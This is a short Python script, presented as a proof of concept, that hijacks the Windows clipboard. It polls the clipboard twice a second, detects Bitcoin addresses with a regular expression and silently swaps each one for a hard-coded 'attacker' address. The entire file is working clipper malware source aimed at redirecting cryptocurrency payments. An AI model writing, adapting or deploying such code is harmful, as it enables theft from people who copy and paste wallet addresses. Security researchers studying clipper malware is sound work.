import time
import re
import win32clipboard

ATTACKER_BTC = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
BTC_PATTERN = re.compile(r"^(1[a-km-zA-HJ-NP-Z1-9]{25,34}|3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-Z0-9]{38,59})$")

def start_poc_attacker():
    print("[+] PoC Attacker active. Watching clipboard...")
    last_seen = ""
    while True:
        try:
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                win32clipboard.CloseClipboard()

                if data != last_seen:
                    last_seen = data
                    if BTC_PATTERN.match(data.strip()) and data.strip() != ATTACKER_BTC:
                        print(f"[!] Target BTC Address Copied: {data}")
                        print(f"[!] Hijacking Clipboard with Attacker's Address...")
                        
                        win32clipboard.OpenClipboard()
                        win32clipboard.EmptyClipboard()
                        win32clipboard.SetClipboardText(ATTACKER_BTC, win32clipboard.CF_UNICODETEXT)
                        win32clipboard.CloseClipboard()
                        last_seen = ATTACKER_BTC
            else:
                win32clipboard.CloseClipboard()
        except Exception:
            pass
        time.sleep(0.5)

if __name__ == "__main__":
    start_poc_attacker()